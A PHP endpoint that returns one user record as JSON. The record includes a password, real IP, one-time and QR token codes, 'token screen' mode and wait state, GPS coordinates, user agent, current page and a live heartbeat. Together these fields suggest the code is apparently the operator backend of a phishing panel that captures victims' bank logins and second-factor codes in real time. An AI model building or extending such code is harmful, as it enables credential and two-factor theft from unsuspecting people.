<?php
require_once __DIR__ . '/../php_config/helpers.php';
verificarAuth();

$usuario_id = intval($_GET['id'] ?? 0);

if (!$usuario_id) {
    jsonError('ID de usuario requerido');
}

try {
    $pdo = conectarBD();

    $stmt = $pdo->prepare("
        SELECT u.id, u.usuarios, u.password, u.ip_real, u.nombre, u.apellido, 
               u.email, u.telefono_movil, u.telefono_fijo, u.token_codigo, 
               u.sgdotoken_codigo, u.sgdotoken_qr_codigo, u.token_qr_imagen_url,
               u.token_pantalla_estado, u.token_pantalla_modo, u.token_pantalla_espera_desde,
               u.comentarios, u.coordenadas_gps, u.gps_estado, u.fecha_ingreso, u.user_agent,
               COALESCE(e.estado, 'offline') as estatus,
               e.pagina_actual,
               e.ultimo_heartbeat,
               CASE 
                   WHEN e.ultimo_heartbeat IS NULL THEN 'Nunca conectado'
                   WHEN e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) THEN 'offline'
                   ELSE e.estado
               END as estado_real
        FROM usuarios u 
        LEFT JOIN estatus_usuarios e ON u.id = e.usuario_id 
        WHERE u.id = ?
    ");
    $stmt->execute([$usuario_id]);
    $usuario = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$usuario) {
        jsonError('Usuario no encontrado', 404);
    }

    jsonResponse(['success' => true, 'usuario' => $usuario]);

} catch (Exception $e) {
    jsonError('Error de base de datos: ' . $e->getMessage(), 500);
}
